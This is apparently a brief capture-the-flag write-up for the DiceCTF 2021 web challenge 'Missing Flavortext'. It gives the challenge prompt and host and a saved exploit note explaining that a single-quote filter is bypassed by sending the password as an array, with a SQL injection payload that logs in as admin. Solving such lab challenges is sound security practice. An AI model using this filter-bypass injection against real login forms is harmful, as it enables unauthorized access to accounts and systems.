Hmm, it looks like there's no flavortext here. Can you try and find it?

missing-flavortext.dicec.tf



root@kali:~/Documents/DiceCTF/2021# cat web-Missing-Flavortext/exploit.txt
The page has a filter to remove the single quote but it can be bypassed

request params as follow:

username=admin&password[]=' OR 1=1 -- &password[]=\'
